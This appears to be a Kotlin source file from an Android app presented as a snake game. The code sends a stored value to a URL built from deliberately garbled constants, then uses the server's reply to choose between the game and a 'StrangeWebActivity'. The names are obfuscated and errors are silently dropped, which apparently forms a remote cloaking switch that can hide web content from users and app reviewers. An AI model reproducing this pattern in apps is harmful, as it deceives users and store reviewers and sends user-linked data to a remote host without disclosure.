package com.snake.io.slither.w

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.snake.io.slither.w.MaaaainClas.Companion.C1efgrth
import com.snake.io.slither.w.MaaaainClas.Companion.dfrgthyhyjsoupCheck
import com.snake.io.slither.w.MaaaainClas.Companion.frtgtlinkFilterPart2
import com.snake.io.slither.w.MaaaainClas.Companion.linkFilterPart1frgt
import com.snake.io.slither.w.MaaaainClas.Companion.odonefrgtgtgt
import com.snake.io.slither.w.gaaaaamy.GamyyyyyyActivity
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class FilterMeOneActivity : AppCompatActivity() {
    lateinit var jsoupedfrgtg: String
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filter_me_one)
        jsoupedfrgtg = ""
        val frgthyujjob = GlobalScope.launch(Dispatchers.IO) {
            jsoupedfrgtg = frtgyhycoroutineTask()
        }

        runBlocking {
            try {
                frgthyujjob.join()

                if (jsoupedfrgtg == dfrgthyhyjsoupCheck) {
                    Intent(applicationContext, GamyyyyyyActivity::class.java).also {
                        startActivity(
                            it
                        )
                    }
                } else {
                    Intent(applicationContext, StrangeWebActivity::class.java).also {
                        startActivity(
                            it
                        )
                    }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }


    private fun getCodeFromUrldfrgythy(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val textfrthy = urlConnection.inputStream.bufferedReader().readText()
            if (textfrthy.isNotEmpty()) {
                jsoupedfrgtg = textfrthy
            } else {
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }

    private suspend fun frtgyhycoroutineTask(): String {
        val efgthysharPref = getSharedPreferences("SP", MODE_PRIVATE)
        val dfrtgthawk: String? = efgthysharPref.getString(C1efgrth, "null")
        val forJsoupSetNaming =
            "${linkFilterPart1frgt}${frtgtlinkFilterPart2}${odonefrgtgtgt}$dfrtgthawk"

        withContext(Dispatchers.IO) {
            getCodeFromUrldfrgythy(forJsoupSetNaming)
        }
        return jsoupedfrgtg
    }
}
